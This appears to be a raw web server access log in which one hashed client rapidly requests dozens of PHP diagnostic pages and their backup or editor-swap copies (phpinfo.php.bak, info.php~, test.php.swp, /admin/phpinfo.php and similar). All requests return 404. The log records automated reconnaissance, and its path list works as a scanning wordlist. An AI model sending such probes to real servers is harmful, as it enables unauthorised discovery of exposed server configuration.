043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:47;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:52;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:52;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:52;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:52;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:52;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:52;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:52;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:52;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:52;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:52;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:52;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:52;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:52;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:52;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:52;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:53;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:53;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:53;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:53;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:53;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:53;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:53;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:53;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:53;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:53;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:53;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:55;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:55;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:55;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:55;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:55;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:55;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:55;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:55;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:55;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:55;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:59;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:59;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:46:59;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:00;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:00;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:00;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:00;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:00;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:00;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:00;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:00;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:00;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:02;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:04;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:05;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:06;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:07;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:08;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:09;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:09;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:09;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:09;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:09;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:09;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/includes/phpinfo.php.save;GET;404
